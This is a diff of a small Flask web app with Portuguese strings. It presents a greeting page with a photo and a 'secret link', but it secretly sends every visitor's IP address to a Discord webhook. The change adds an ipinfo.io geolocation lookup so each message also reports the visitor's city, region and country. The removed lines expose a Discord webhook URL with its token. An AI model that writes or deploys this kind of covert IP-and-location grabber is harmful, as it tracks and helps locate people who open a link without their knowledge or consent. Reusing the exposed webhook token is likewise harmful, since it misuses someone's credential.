@@ -4,24 +4,46 @@ import requests
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1466478241031131217/mYik7TijEancs0yK6djeIoK3W8HM4St6O-J_uWWuKdne9g4Z1mj_qRke9D_0z1hEkwzg"
+# 👉 Cole aqui o seu webhook do Discord
+WEBHOOK_URL = "COLOQUE_SEU_WEBHOOK_AQUI"
+
+def get_location(ip):
+    try:
+        response = requests.get(f"https://ipinfo.io/{ip}/json")
+        if response.status_code == 200:
+            data = response.json()
+            cidade = data.get("city", "Desconhecida")
+            regiao = data.get("region", "Desconhecida")
+            pais = data.get("country", "Desconhecido")
+            return f"{cidade}, {regiao}, {pais}"
+    except:
+        pass
+    return "Localização não encontrada"
 
 @app.route('/')
 def home():
     ip = request.remote_addr
-    data = {"content": f"📢 Alguém acessou a página inicial! IP: {ip}"}
+    localizacao = get_location(ip)
+
+    data = {
+        "content": f"📢 Alguém acessou a página inicial!\nIP: {ip}\nLocalização: {localizacao}"
+    }
     requests.post(WEBHOOK_URL, json=data)
 
     return '''
         <h1>Olá, mundo! Este é o início do projeto.</h1>
-        <img src="https://scontent.fslz4-1.fna.fbcdn.net/v/t1.6435-9/70734133_937164883300936_3042617985685520384_n.jpg?_nc_cat=102&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEg_ul9WZc-DS93rlNlOvlLMWfAYLq_TjgxZ8Bgur9OOCBzJzZDDI0Q8bBy6ADwqNwLk_tRNpVEDGEJRUpQ2bhH&_nc_ohc=LXvgAnZY96kQ7kNvwEA6hzE&_nc_oc=AdlHDutrdG9VlHs8KMW-I7-heWmbBC8aOs5WxJmqtyXMKSLcP8rRv7l767odzcKqyaA&_nc_zt=23&_nc_ht=scontent.fslz4-1.fna&_nc_gid=eP0pJWkz0r7fHGQitLZmjw&oh=00_Afrscey8UpeuwwrI7H20gUJs737VNnGdFG3a8qP4qYaBFw&oe=69A35071" 
+        <img src="https://scontent.fslz4-1.fna.fbcdn.net/v/t1.6435-9/70734133_937164883300936_3042617985685520384_n.jpg"
              alt="Minha Foto" width="400">
     '''
 
 @app.route('/link-secreto')
 def link_secreto():
     ip = request.remote_addr
-    data = {"content": f"🔑 Alguém acessou o link secreto! IP: {ip}"}
+    localizacao = get_location(ip)
+
+    data = {
+        "content": f"🔑 Alguém acessou o link secreto!\nIP: {ip}\nLocalização: {localizacao}"
+    }
     requests.post(WEBHOOK_URL, json=data)
 
     return 'Você acessou o link secreto com sucesso!'
